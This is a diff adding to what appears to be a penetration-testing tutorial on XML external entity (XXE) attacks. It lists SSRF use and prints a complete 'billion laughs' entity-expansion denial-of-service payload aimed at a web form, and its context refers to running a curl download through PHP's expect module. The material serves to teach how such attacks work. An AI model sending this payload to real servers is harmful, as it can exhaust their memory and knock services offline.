@@ -74,5 +74,32 @@ Now, we can use the following XML code to execute a curl command that downloads 
 <message></message>
 </root>
 ```
+*Note: The expect module is not enabled/installed by default on modern PHP servers, so this attack may not always work. This is why XXE is usually used to disclose sensitive local files and source code, which may reveal additional vulnerabilities or ways to gain code execution.*
 
+### Other XXE Attacks
+- SSRF exploitation via XXE to enumerate locally open ports and access their pages, among other restricted web pages.
+- Denial of Service (DOS) to the hosting web server, with the use the following payload:
+  ```
+  <?xml version="1.0"?>
+  <!DOCTYPE email [
+    <!ENTITY a0 "DOS" >
+    <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
+    <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
+    <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
+    <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
+    <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
+    <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
+    <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
+    <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
+    <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
+    <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
+  ]>
+  <root>
+  <name></name>
+  <tel></tel>
+  <email>&a10;</email>
+  <message></message>
+  </root>
+  ```
+  This payload defines the a0 entity as DOS, references it in a1 multiple times, references a1 in a2, and so on until the back-end server's memory runs out due to the self-reference loops. However, this attack no longer works with modern web servers (e.g., Apache), as they protect against entity self-reference.
  
